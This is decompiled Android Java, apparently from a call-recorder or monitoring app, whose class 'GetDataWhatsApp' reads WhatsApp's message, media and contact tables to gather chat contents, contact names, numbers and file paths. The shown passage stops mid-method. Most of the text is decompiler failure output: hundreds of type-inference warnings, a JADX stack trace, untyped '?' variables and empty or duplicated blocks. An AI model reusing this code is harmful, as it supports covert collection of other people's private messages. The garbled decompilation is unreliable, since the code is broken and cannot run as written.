package com.yasoka.spcallrecord.recorder.call.a.c.d;

import a.c.e.e;
import a.c.f.a;
import a.c.j.c;
import android.content.Context;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import com.app.activity.MyApp;
import com.crashlytics.android.Crashlytics;
import java.io.DataOutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

/* compiled from: GetDataWhatsApp */
public class j extends h implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f171b;

    /* renamed from: a reason: collision with root package name */
    private final Context f172a;

    public j(Context context) {
        this.f172a = context;
    }

    /* JADX WARNING: type inference failed for: r29v0, types: [long] */
    /* JADX WARNING: type inference failed for: r10v0, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v1, types: [long] */
    /* JADX WARNING: type inference failed for: r7v0, types: [android.database.Cursor] */
    /* JADX WARNING: type inference failed for: r0v3, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r5v0 */
    /* JADX WARNING: type inference failed for: r1v3 */
    /* JADX WARNING: type inference failed for: r2v0 */
    /* JADX WARNING: type inference failed for: r10v1 */
    /* JADX WARNING: type inference failed for: r7v1, types: [android.database.Cursor] */
    /* JADX WARNING: type inference failed for: r5v1 */
    /* JADX WARNING: type inference failed for: r2v1 */
    /* JADX WARNING: type inference failed for: r1v4 */
    /* JADX WARNING: type inference failed for: r0v4, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r24v1 */
    /* JADX WARNING: type inference failed for: r9v1, types: [long] */
    /* JADX WARNING: type inference failed for: r2v3, types: [android.database.Cursor] */
    /* JADX WARNING: type inference failed for: r24v2 */
    /* JADX WARNING: type inference failed for: r9v2 */
    /* JADX WARNING: type inference failed for: r9v3 */
    /* JADX WARNING: type inference failed for: r24v3 */
    /* JADX WARNING: type inference failed for: r9v4 */
    /* JADX WARNING: type inference failed for: r9v5 */
    /* JADX WARNING: type inference failed for: r24v4 */
    /* JADX WARNING: type inference failed for: r24v5 */
    /* JADX WARNING: type inference failed for: r10v2 */
    /* JADX WARNING: type inference failed for: r7v2 */
    /* JADX WARNING: type inference failed for: r5v2 */
    /* JADX WARNING: type inference failed for: r2v5 */
    /* JADX WARNING: type inference failed for: r1v8 */
    /* JADX WARNING: type inference failed for: r0v12 */
    /* JADX WARNING: type inference failed for: r16v0 */
    /* JADX WARNING: type inference failed for: r17v0 */
    /* JADX WARNING: type inference failed for: r20v0 */
    /* JADX WARNING: type inference failed for: r24v6 */
    /* JADX WARNING: type inference failed for: r23v0 */
    /* JADX WARNING: type inference failed for: r9v6 */
    /* JADX WARNING: type inference failed for: r5v3 */
    /* JADX WARNING: type inference failed for: r0v13 */
    /* JADX WARNING: type inference failed for: r1v9 */
    /* JADX WARNING: type inference failed for: r2v6 */
    /* JADX WARNING: type inference failed for: r10v3 */
    /* JADX WARNING: type inference failed for: r7v3 */
    /* JADX WARNING: type inference failed for: r29v1 */
    /* JADX WARNING: type inference failed for: r9v8 */
    /* JADX WARNING: type inference failed for: r4v0, types: [long] */
    /* JADX WARNING: type inference failed for: r16v1 */
    /* JADX WARNING: type inference failed for: r17v1 */
    /* JADX WARNING: type inference failed for: r24v7 */
    /* JADX WARNING: type inference failed for: r23v1 */
    /* JADX WARNING: type inference failed for: r5v4 */
    /* JADX WARNING: type inference failed for: r2v7 */
    /* JADX WARNING: type inference failed for: r1v11 */
    /* JADX WARNING: type inference failed for: r0v19 */
    /* JADX WARNING: type inference failed for: r10v4 */
    /* JADX WARNING: type inference failed for: r7v4 */
    /* JADX WARNING: type inference failed for: r20v1 */
    /* JADX WARNING: type inference failed for: r24v8 */
    /* JADX WARNING: type inference failed for: r23v2 */
    /* JADX WARNING: type inference failed for: r9v10 */
    /* JADX WARNING: type inference failed for: r5v5 */
    /* JADX WARNING: type inference failed for: r0v20 */
    /* JADX WARNING: type inference failed for: r1v12 */
    /* JADX WARNING: type inference failed for: r22v0 */
    /* JADX WARNING: type inference failed for: r20v2 */
    /* JADX WARNING: type inference failed for: r1v13 */
    /* JADX WARNING: type inference failed for: r8v3 */
    /* JADX WARNING: type inference failed for: r9v11, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r24v9 */
    /* JADX WARNING: type inference failed for: r9v12 */
    /* JADX WARNING: type inference failed for: r22v1 */
    /* JADX WARNING: type inference failed for: r9v13 */
    /* JADX WARNING: type inference failed for: r24v10 */
    /* JADX WARNING: type inference failed for: r22v2 */
    /* JADX WARNING: type inference failed for: r20v3 */
    /* JADX WARNING: type inference failed for: r18v1 */
    /* JADX WARNING: type inference failed for: r6v2 */
    /* JADX WARNING: type inference failed for: r27v1 */
    /* JADX WARNING: type inference failed for: r24v11 */
    /* JADX WARNING: type inference failed for: r23v3 */
    /* JADX WARNING: type inference failed for: r0v28 */
    /* JADX WARNING: type inference failed for: r1v15 */
    /* JADX WARNING: type inference failed for: r5v6 */
    /* JADX WARNING: type inference failed for: r2v8 */
    /* JADX WARNING: type inference failed for: r23v4 */
    /* JADX WARNING: type inference failed for: r27v2 */
    /* JADX WARNING: type inference failed for: r24v12 */
    /* JADX WARNING: type inference failed for: r9v14 */
    /* JADX WARNING: type inference failed for: r3v5, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r4v1, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r3v6, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r4v2, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r27v3 */
    /* JADX WARNING: type inference failed for: r9v15 */
    /* JADX WARNING: type inference failed for: r23v5 */
    /* JADX WARNING: type inference failed for: r24v13 */
    /* JADX WARNING: type inference failed for: r6v5 */
    /* JADX WARNING: type inference failed for: r18v2 */
    /* JADX WARNING: type inference failed for: r22v3 */
    /* JADX WARNING: type inference failed for: r18v3 */
    /* JADX WARNING: type inference failed for: r6v6 */
    /* JADX WARNING: type inference failed for: r22v4 */
    /* JADX WARNING: type inference failed for: r22v5 */
    /* JADX WARNING: type inference failed for: r18v4 */
    /* JADX WARNING: type inference failed for: r6v7 */
    /* JADX WARNING: type inference failed for: r4v3 */
    /* JADX WARNING: type inference failed for: r20v4 */
    /* JADX WARNING: type inference failed for: r22v6 */
    /* JADX WARNING: type inference failed for: r18v5 */
    /* JADX WARNING: type inference failed for: r6v8 */
    /* JADX WARNING: type inference failed for: r4v4 */
    /* JADX WARNING: type inference failed for: r22v7 */
    /* JADX WARNING: type inference failed for: r18v6 */
    /* JADX WARNING: type inference failed for: r6v9 */
    /* JADX WARNING: type inference failed for: r4v5 */
    /* JADX WARNING: type inference failed for: r18v7 */
    /* JADX WARNING: type inference failed for: r6v10 */
    /* JADX WARNING: type inference failed for: r22v8 */
    /* JADX WARNING: type inference failed for: r6v11, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r18v8 */
    /* JADX WARNING: type inference failed for: r22v9 */
    /* JADX WARNING: type inference failed for: r18v9 */
    /* JADX WARNING: type inference failed for: r22v10 */
    /* JADX WARNING: type inference failed for: r18v10 */
    /* JADX WARNING: type inference failed for: r4v6 */
    /* JADX WARNING: type inference failed for: r18v11 */
    /* JADX WARNING: type inference failed for: r22v11 */
    /* JADX WARNING: type inference failed for: r4v7 */
    /* JADX WARNING: type inference failed for: r18v12 */
    /* JADX WARNING: type inference failed for: r4v8, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r22v12 */
    /* JADX WARNING: type inference failed for: r4v9 */
    /* JADX WARNING: type inference failed for: r4v11, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r22v13 */
    /* JADX WARNING: type inference failed for: r22v14 */
    /* JADX WARNING: type inference failed for: r22v15 */
    /* JADX WARNING: type inference failed for: r4v12, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r4v13, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r0v50, types: [java.lang.String[]] */
    /* JADX WARNING: type inference failed for: r0v52 */
    /* JADX WARNING: type inference failed for: r4v14 */
    /* JADX WARNING: type inference failed for: r22v16 */
    /* JADX WARNING: type inference failed for: r22v17 */
    /* JADX WARNING: type inference failed for: r4v15, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r22v18 */
    /* JADX WARNING: type inference failed for: r20v5 */
    /* JADX WARNING: type inference failed for: r1v20 */
    /* JADX WARNING: type inference failed for: r22v19 */
    /* JADX WARNING: type inference failed for: r20v6 */
    /* JADX WARNING: type inference failed for: r1v21 */
    /* JADX WARNING: type inference failed for: r20v7 */
    /* JADX WARNING: type inference failed for: r22v20 */
    /* JADX WARNING: type inference failed for: r20v8 */
    /* JADX WARNING: type inference failed for: r22v21 */
    /* JADX WARNING: type inference failed for: r1v25 */
    /* JADX WARNING: type inference failed for: r1v26, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v27, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r0v64, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v28, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r0v66 */
    /* JADX WARNING: type inference failed for: r1v29 */
    /* JADX WARNING: type inference failed for: r1v32, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v33, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v34, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v35, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v36, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v37, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v38, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v39, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v40, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v41, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v42, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v43, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r0v91, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r0v92, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v44, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v45, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r0v97, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v46 */
    /* JADX WARNING: type inference failed for: r1v47 */
    /* JADX WARNING: type inference failed for: r1v48 */
    /* JADX WARNING: type inference failed for: r1v49, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v50, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v51, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r1v52, types: [java.lang.String] */
    /* JADX WARNING: type inference failed for: r10v9 */
    /* JADX WARNING: type inference failed for: r7v9 */
    /* JADX WARNING: type inference failed for: r0v104 */
    /* JADX WARNING: type inference failed for: r1v53 */
    /* JADX WARNING: type inference failed for: r2v26 */
    /* JADX WARNING: type inference failed for: r24v14 */
    /* JADX WARNING: type inference failed for: r24v15 */
    /* JADX WARNING: type inference failed for: r9v27 */
    /* JADX WARNING: type inference failed for: r9v28 */
    /* JADX WARNING: type inference failed for: r9v29 */
    /* JADX WARNING: type inference failed for: r24v16 */
    /* JADX WARNING: type inference failed for: r10v10 */
    /* JADX WARNING: type inference failed for: r7v10 */
    /* JADX WARNING: type inference failed for: r5v23 */
    /* JADX WARNING: type inference failed for: r2v27 */
    /* JADX WARNING: type inference failed for: r1v54 */
    /* JADX WARNING: type inference failed for: r0v105 */
    /* JADX WARNING: type inference failed for: r24v17 */
    /* JADX WARNING: type inference failed for: r24v18 */
    /* JADX WARNING: type inference failed for: r5v24 */
    /* JADX WARNING: type inference failed for: r2v28 */
    /* JADX WARNING: type inference failed for: r1v55 */
    /* JADX WARNING: type inference failed for: r0v106 */
    /* JADX WARNING: type inference failed for: r22v22 */
    /* JADX WARNING: type inference failed for: r22v23 */
    /* JADX WARNING: type inference failed for: r20v9 */
    /* JADX WARNING: type inference failed for: r20v10 */
    /* JADX WARNING: type inference failed for: r9v30 */
    /* JADX WARNING: type inference failed for: r24v19 */
    /* JADX WARNING: type inference failed for: r9v31 */
    /* JADX WARNING: type inference failed for: r22v24 */
    /* JADX WARNING: type inference failed for: r22v25 */
    /* JADX WARNING: type inference failed for: r24v20 */
    /* JADX WARNING: type inference failed for: r23v6 */
    /* JADX WARNING: type inference failed for: r24v21 */
    /* JADX WARNING: type inference failed for: r24v22 */
    /* JADX WARNING: type inference failed for: r22v26 */
    /* JADX WARNING: type inference failed for: r18v22 */
    /* JADX WARNING: type inference failed for: r6v18 */
    /* JADX WARNING: type inference failed for: r22v27 */
    /* JADX WARNING: type inference failed for: r22v28 */
    /* JADX WARNING: type inference failed for: r22v29 */
    /* JADX WARNING: type inference failed for: r22v30 */
    /* JADX WARNING: type inference failed for: r18v23 */
    /* JADX WARNING: type inference failed for: r18v24 */
    /* JADX WARNING: type inference failed for: r6v19 */
    /* JADX WARNING: type inference failed for: r6v20 */
    /* JADX WARNING: type inference failed for: r4v16 */
    /* JADX WARNING: type inference failed for: r4v17 */
    /* JADX WARNING: type inference failed for: r22v31 */
    /* JADX WARNING: type inference failed for: r18v25 */
    /* JADX WARNING: type inference failed for: r6v21 */
    /* JADX WARNING: type inference failed for: r6v22 */
    /* JADX WARNING: type inference failed for: r6v23 */
    /* JADX WARNING: type inference failed for: r6v24 */
    /* JADX WARNING: type inference failed for: r6v25 */
    /* JADX WARNING: type inference failed for: r18v26 */
    /* JADX WARNING: type inference failed for: r22v32 */
    /* JADX WARNING: type inference failed for: r18v27 */
    /* JADX WARNING: type inference failed for: r4v18 */
    /* JADX WARNING: type inference failed for: r18v28 */
    /* JADX WARNING: type inference failed for: r18v29 */
    /* JADX WARNING: type inference failed for: r18v30 */
    /* JADX WARNING: type inference failed for: r18v31 */
    /* JADX WARNING: type inference failed for: r18v32 */
    /* JADX WARNING: type inference failed for: r18v33 */
    /* JADX WARNING: type inference failed for: r4v19 */
    /* JADX WARNING: type inference failed for: r22v33 */
    /* JADX WARNING: type inference failed for: r4v20 */
    /* JADX WARNING: type inference failed for: r4v21 */
    /* JADX WARNING: type inference failed for: r4v22 */
    /* JADX WARNING: type inference failed for: r4v23 */
    /* JADX WARNING: type inference failed for: r22v34 */
    /* JADX WARNING: type inference failed for: r22v35 */
    /* JADX WARNING: type inference failed for: r22v36 */
    /* JADX WARNING: type inference failed for: r22v37 */
    /* JADX WARNING: type inference failed for: r22v38 */
    /* JADX WARNING: type inference failed for: r4v24 */
    /* JADX WARNING: type inference failed for: r4v25 */
    /* JADX WARNING: type inference failed for: r4v26 */
    /* JADX WARNING: type inference failed for: r22v39 */
    /* JADX WARNING: type inference failed for: r22v40 */
    /* JADX WARNING: type inference failed for: r4v27 */
    /* JADX WARNING: type inference failed for: r22v41 */
    /* JADX WARNING: type inference failed for: r20v11 */
    /* JADX WARNING: type inference failed for: r1v56 */
    /* JADX WARNING: type inference failed for: r22v42 */
    /* JADX WARNING: type inference failed for: r20v12 */
    /* JADX WARNING: type inference failed for: r20v13 */
    /* JADX WARNING: type inference failed for: r20v14 */
    /* JADX WARNING: type inference failed for: r22v43 */
    /* JADX WARNING: type inference failed for: r22v44 */
    /* JADX WARNING: type inference failed for: r1v57 */
    /* JADX WARNING: type inference failed for: r1v58 */
    /* JADX WARNING: type inference failed for: r1v59 */
    /* JADX WARNING: type inference failed for: r1v60 */
    /* JADX WARNING: type inference failed for: r0v107 */
    /* JADX WARNING: type inference failed for: r1v61 */
    /* JADX WARNING: type inference failed for: r1v62 */
    /* JADX WARNING: type inference failed for: r1v63 */
    /* JADX WARNING: type inference failed for: r1v64 */
    /* JADX WARNING: type inference failed for: r1v65 */
    /* JADX WARNING: type inference failed for: r1v66 */
    /* JADX WARNING: type inference failed for: r1v67 */
    /* JADX WARNING: type inference failed for: r1v68 */
    /* JADX WARNING: type inference failed for: r1v69 */
    /* JADX WARNING: type inference failed for: r1v70 */
    /* JADX WARNING: type inference failed for: r1v71 */
    /* JADX WARNING: type inference failed for: r0v108 */
    /* JADX WARNING: type inference failed for: r0v109 */
    /* JADX WARNING: type inference failed for: r1v72 */
    /* JADX WARNING: type inference failed for: r1v73 */
    /* JADX WARNING: type inference failed for: r1v74 */
    /* JADX WARNING: type inference failed for: r1v75 */
    /* JADX WARNING: type inference failed for: r1v76 */
    /* JADX WARNING: type inference failed for: r1v77 */
    /* JADX WARNING: type inference failed for: r1v78 */
    /* JADX WARNING: type inference failed for: r1v79 */
    /* JADX WARNING: type inference failed for: r1v80 */
    /* JADX WARNING: type inference failed for: r1v81 */
    /* JADX WARNING: type inference failed for: r1v82 */
    /* JADX WARNING: Code restructure failed: missing block: B:103:0x0230, code lost:
        if (r1.isEmpty() != false) goto L_0x0232;
     */
    /* JADX WARNING: Incorrect type for immutable var: ssa=long, code=null, for r29v0, types: [long] */
    /* JADX WARNING: Multi-variable type inference failed. Error: jadx.core.utils.exceptions.JadxRuntimeException: No candidate types for var: r24v2
  assigns: []
  uses: []
  mth insns count: 609
    	at jadx.core.dex.visitors.typeinference.TypeSearch.fillTypeCandidates(TypeSearch.java:237)
    	at java.util.ArrayList.forEach(Unknown Source)
    	at jadx.core.dex.visitors.typeinference.TypeSearch.run(TypeSearch.java:53)
    	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.runMultiVariableSearch(TypeInferenceVisitor.java:99)
    	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:92)
    	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:27)
    	at jadx.core.dex.visitors.DepthTraversal.lambda$visit$1(DepthTraversal.java:14)
    	at java.util.ArrayList.forEach(Unknown Source)
    	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:14)
    	at jadx.core.ProcessClass.process(ProcessClass.java:30)
    	at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:311)
    	at jadx.api.JavaClass.decompile(JavaClass.java:62)
    	at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:217)
     */
    /* JADX WARNING: Removed duplicated region for block: B:162:0x0350 A[Catch:{ Exception -> 0x04b4 }] */
    /* JADX WARNING: Removed duplicated region for block: B:232:0x0420  */
    /* JADX WARNING: Removed duplicated region for block: B:234:0x042f  */
    /* JADX WARNING: Removed duplicated region for block: B:242:0x0464 A[Catch:{ Exception -> 0x0492 }] */
    /* JADX WARNING: Removed duplicated region for block: B:260:0x04f5  */
    /* JADX WARNING: Unknown variable types count: 110 */
    private void a(Context context, String str, String str2, long r29) throws Exception {
        ? r24;
        ? r9;
        ? r242;
        ? r92;
        ? r93;
        ? r94;
        ? r243;
        ? r10;
        ? r7;
        ? r5;
        ? r2;
        ? r1;
        ? r0;
        ? r244;
        ? r245;
        ? r23;
        String str3;
        SimpleDateFormat simpleDateFormat;
        ? r52;
        ? r22;
        ? r222;
        SimpleDateFormat simpleDateFormat2;
        ? r20;
        String str4;
        ? r12;
        int i;
        ? r246;
        ? r95;
        ? r223;
        ? r224;
        ? r202;
        ? r18;
        String str5;
        ? r6;
        ? r27;
        ? r247;
        ? r232;
        ? r225;
        ? r182;
        ? r62;
        ? r4;
        ? r226;
        ? r183;
        ? r63;
        ? r42;
        ? r227;
        ? r184;
        ? r64;
        ? r228;
        ? r185;
        ? r229;
        ? r186;
        ? r43;
        ? r2210;
        ? r44;
        ? string;
        ? r2211;
        ? r2212;
        ? r45;
        ? r13;
        ? r02;
        ? r14;
        ? r15;
        Context context2 = context;
        ? r102 = "jid";
        String str6 = "-1";
        String str7 = ")";
        String str8 = " - (";
        SimpleDateFormat d2 = c.d();
        a aVar = new a(context2, a.c.e.c.a(), str);
        aVar.b();
        ? r16 = r29;
        ? i2 = aVar.i("messages", (long) r16);
        if (i2 != 0) {
            if (i2.getCount() <= 0) {
                a(aVar, i2);
            } else {
                ? r03 = "";
                ? r53 = r16;
                ? r17 = r03;
                ? r25 = r17;
                ? r103 = r102;
                ? r72 = i2;
                ? r04 = r03;
                ? r19 = r17;
                while (r72.moveToNext()) {
                    try {
                        if (r04 == 0 || r04.equals(str6)) {
                            r244 = r72;
                            String str9 = str6;
                            SimpleDateFormat simpleDateFormat3 = d2;
                            String str10 = str2;
                            r5 = r53;
                            d2 = simpleDateFormat3;
                            r0 = r04;
                            r1 = r19;
                            r2 = r25;
                            str6 = str9;
                            r102 = r103;
                            i2 = r244;
                            Context context3 = context;
                            r243 = r244;
                        } else {
                            ? r292 = r53;
                            try {
                                ? r46 = r72.getLong(r72.getColumnIndexOrThrow("timestamp"));
                                Date date = new Date();
                                date.setTime(r46);
                                Date date2 = new Date();
                                ? r162 = r04;
                                ? r172 = r19;
                                date2.setTime(e.v(context));
                                Calendar instance = Calendar.getInstance();
                                instance.setTime(date2);
                                instance.add(13, 1);
                                if (date.compareTo(instance.getTime()) > 0) {
                                    try {
                                        String string2 = r72.getString(r72.getColumnIndexOrThrow("_id"));
                                        int i3 = r72.getInt(r72.getColumnIndexOrThrow("media_wa_type"));
                                        String str11 = "media_caption";
                                        r20 = r25;
                                        String str12 = " - ";
                                        String str13 = "file_path";
                                        simpleDateFormat2 = d2;
                                        String str14 = "message_row_id";
                                        r222 = r103;
                                        String str15 = "message_media";
                                        if (i3 == 3 || i3 == 13) {
                                            str4 = str6;
                                            ? r110 = "<i class='fa fa-file-video-o'></i>";
                                            try {
                                                Cursor a2 = aVar.a(str15, str14, string2);
                                                if (!(a2 == null || a2.getCount() == 0)) {
                                                    a2.moveToFirst();
                                                    String string3 = a2.getString(a2.getColumnIndexOrThrow(str13));
                                                    if (string3 != null && !string3.isEmpty()) {
                                                        StringBuilder sb = new StringBuilder();
                                                        sb.append(r110);
                                                        sb.append(str12);
                                                        sb.append(string3);
                                                        r110 = sb.toString();
                                                    }
                                                }
                                                String string4 = r72.getString(r72.getColumnIndexOrThrow(str11));
                                                if (string4 != null && !string4.isEmpty()) {
                                                    StringBuilder sb2 = new StringBuilder();
                                                    sb2.append(r12);
                                                    sb2.append(str8);
                                                    sb2.append(string4);
                                                    sb2.append(str7);
                                                    r02 = sb2.toString();
                                                }
                                            } catch (Exception e2) {
                                                r12 = r110;
                                                e2.getStackTrace();
                                                r20 = r20;
                                                r222 = r222;
                                                r12 = r110;
                                                r12 = r110;
                                            }
                                            ? r8 = r12;
                                            i = r72.getInt(r72.getColumnIndexOrThrow("key_from_me"));
                                            r93 = r72.getString(r72.getColumnIndexOrThrow("key_remote_jid"));
                                            date.setTime(r46);
                                            if (r93 == 0) {
                                                str5 = str4;
                                                if (!r93.equals(str5)) {
                                                    try {
                                                        try {
                                                            a aVar2 = new a(context, a.c.e.c.a(), str2);
                                                            aVar2.b();
                                                            ? r65 = r222;
                                                            try {
                                                                Cursor a3 = aVar2.a("wa_contacts", r65, r93);
                                                                if (a3 == null || a3.getCount() == 0) {
                                                                    r186 = r46;
                                                                    r229 = r72;
                                                                    r43 = r20;
                                                                } else {
                                                                    a3.moveToFirst();
                                                                    ? r187 = r46;
                                                                    ? r47 = "display_name";
                                                                    try {
                                                                        r2210 = r222;
                                                                        r44 = r47;
                                                                        string = a3.getString(a3.getColumnIndexOrThrow(r47));
                                                                    } catch (Exception e3) {
                                                                        e = e3;
                                                                        r185 = r187;
                                                                        r228 = r72;
                                                                        r64 = r65;
                                                                        r184 = r185;
                                                                        r42 = r20;
                                                                        r226 = r227;
                                                                        r183 = r184;
                                                                        r63 = r64;
                                                                        try {
                                                                            r246 = r243;
                                                                            r95 = r93;
                                                                            r223 = r226;
                                                                            e.getMessage();
                                                                            r223 = r226;
                                                                            try {
                                                                                e.getStackTrace();
                                                                                Crashlytics.logException(e);
                                                                                r225 = r226;
                                                                                r182 = r183;
                                                                                r62 = r63;
                                                                                r4 = r42;
                                                                            } catch (Exception unused) {
                                                                                r225 = r226;
                                                                                r182 = r183;
                                                                                r62 = r63;
                                                                                r4 = r42;
                                                                            }
                                                                            r202 = r4;
                                                                            r224 = r225;
                                                                            r18 = r182;
                                                                            r6 = r62;
                                                                            if (i == 0) {
                                                                            }
                                                                            r03 = r27;
                                                                            r17 = r8;
                                                                            r52 = r18;
                                                                            r22 = r202;
                                                                            r245 = r247;
                                                                            r23 = r232;
                                                                            Context context4 = context;
                                                                            d2 = simpleDateFormat;
                                                                            str6 = str3;
                                                                            r102 = r23;
                                                                            i2 = r245;
                                                                            r243 = r245;
                                                                            r5 = r52;
                                                                            r2 = r22;
                                                                            r1 = r17;
                                                                            r0 = r03;
                                                                            r103 = r10;
                                                                            r72 = r7;
                                                                            r53 = r5;
                                                                            r25 = r2;
                                                                            r19 = r1;
                                                                            r04 = r0;
                                                                        } catch (Exception e4) {
                                                                            e = e4;
                                                                            r92 = r292;
                                                                            r242 = r223;
                                                                            e.getStackTrace();
                                                                            try {
                                                                                e.getStackTrace();
                                                                                Crashlytics.logException(e);
                                                                                r24 = r242;
                                                                                r9 = r92;
                                                                            } catch (Exception unused2) {
                                                                                r24 = r242;
                                                                                r9 = r92;
                                                                            }
                                                                            if (r9 != 0) {
                                                                            }
                                                                            a(aVar, r24);
                                                                            return;
                                                                        }
                                                                    }
                                                                    try {
                                                                        r2210 = r222;
                                                                        r44 = string;
                                                                        String string5 = a3.getString(a3.getColumnIndexOrThrow("number"));
                                                                        if (string5 == null || string5.isEmpty()) {
                                                                            r2212 = r72;
                                                                            r45 = string;
                                                                        } else {
                                                                            ? r2213 = r72;
                                                                            try {
                                                                                StringBuilder sb3 = new StringBuilder();
                                                                                sb3.append(string);
                                                                                sb3.append(str8);
                                                                                sb3.append(string5);
                                                                                sb3.append(str7);
                                                                                r2212 = r2213;
                                                                                r45 = sb3.toString();
                                                                            } catch (Exception e5) {
                                                                                e = e5;
                                                                                r2211 = r2213;
                                                                                r63 = r65;
                                                                                r183 = r187;
                                                                                r42 = string;
                                                                                r226 = r2211;
                                                                                r246 = r243;
                                                                                r95 = r93;
                                                                                r223 = r226;
                                                                                e.getMessage();
                                                                                r223 = r226;
                                                                                e.getStackTrace();
                                                                                Crashlytics.logException(e);
                                                                                r225 = r226;
                                                                                r182 = r183;
                                                                                r62 = r63;
                                                                                r4 = r42;
                                                                                r202 = r4;
                                                                                r224 = r225;
                                                                                r18 = r182;
                                                                                r6 = r62;
                                                                                if (i == 0) {
                                                                                }
                                                                                r03 = r27;
                                                                                r17 = r8;
                                                                                r52 = r18;
                                                                                r22 = r202;
                                                                                r245 = r247;
                                                                                r23 = r232;
                                                                                Context context42 = context;
                                                                                d2 = simpleDateFormat;
                                                                                str6 = str3;
                                                                                r102 = r23;
                                                                                i2 = r245;
                                                                                r243 = r245;
                                                                                r5 = r52;
                                                                                r2 = r22;
                                                                                r1 = r17;
                                                                                r0 = r03;
                                                                                r103 = r10;
                                                                                r72 = r7;
                                                                                r53 = r5;
                                                                                r25 = r2;
                                                                                r19 = r1;
                                                                                r04 = r0;
                                                                            }
                                                                        }
                                                                        if (r45 != 0) {
                                                                            if (!r45.equals("undefined")) {
                                                                                r186 = r187;
                                                                                r229 = r2212;
                                                                                r43 = r45;
                                                                            }
                                                                        }
                                                                        ? string6 = a3.getString(a3.getColumnIndexOrThrow(r65));
                                                                        try {
                                                                            try {
                                                                                r43 = string6.split("@")[0];
                                                                                r186 = r187;
                                                                                r229 = r2212;
                                                                            } catch (Exception e6) {
                                                                                e = e6;
                                                                                try {
                                                                                    r2210 = r2212;
                                                                                    r44 = string6;
                                                                                    e.getStackTrace();
                                                                                    r186 = r187;
                                                                                    r229 = r2212;
                                                                                    r43 = string6;
                                                                                    aVar2.a();
                                                                                    r62 = r65;
                                                                                    r225 = r229;
                                                                                    r182 = r186;
                                                                                    r4 = r43;
                                                                                } catch (Exception e7) {
                                                                                    e = e7;
                                                                                    r63 = r65;
                                                                                    r183 = r187;
                                                                                    r226 = r2210;
                                                                                    r42 = r44;
                                                                                    r246 = r243;
                                                                                    r95 = r93;
                                                                                    r223 = r226;
                                                                                    e.getMessage();
                                                                                    r223 = r226;
                                                                                    e.getStackTrace();
                                                                                    Crashlytics.logException(e);
                                                                                    r225 = r226;
                                                                                    r182 = r183;
                                                                                    r62 = r63;
                                                                                    r4 = r42;
                                                                                    r202 = r4;
                                                                                    r224 = r225;
                                                                                    r18 = r182;
                                                                                    r6 = r62;
                                                                                    if (i == 0) {
                                                                                    }
                                                                                    r03 = r27;
                                                                                    r17 = r8;
                                                                                    r52 = r18;
                                                                                    r22 = r202;
                                                                                    r245 = r247;
                                                                                    r23 = r232;
                                                                                    Context context422 = context;
                                                                                    d2 = simpleDateFormat;
                                                                                    str6 = str3;
                                                                                    r102 = r23;
                                                                                    i2 = r245;
                                                                                    r243 = r245;
                                                                                    r5 = r52;
                                                                                    r2 = r22;
                                                                                    r1 = r17;
                                                                                    r0 = r03;
                                                                                    r103 = r10;
                                                                                    r72 = r7;
                                                                                    r53 = r5;
                                                                                    r25 = r2;
                                                                                    r19 = r1;
                                                                                    r04 = r0;
                                                                                }
                                                                                r202 = r4;
                                                                                r224 = r225;
                                                                                r18 = r182;
                                                                                r6 = r62;
                                                                                if (i == 0) {
                                                                                }
                                                                                r03 = r27;
                                                                                r17 = r8;
                                                                                r52 = r18;
                                                                                r22 = r202;
                                                                                r245 = r247;
                                                                                r23 = r232;
                                                                                Context context4222 = context;
                                                                                d2 = simpleDateFormat;
                                                                                str6 = str3;
                                                                                r102 = r23;
                                                                                i2 = r245;
                                                                                r243 = r245;
                                                                                r5 = r52;
                                                                                r2 = r22;
                                                                                r1 = r17;
                                                                                r0 = r03;
                                                                                r103 = r10;
                                                                                r72 = r7;
                                                                                r53 = r5;
                                                                                r25 = r2;
                                                                                r19 = r1;
                                                                                r04 = r0;
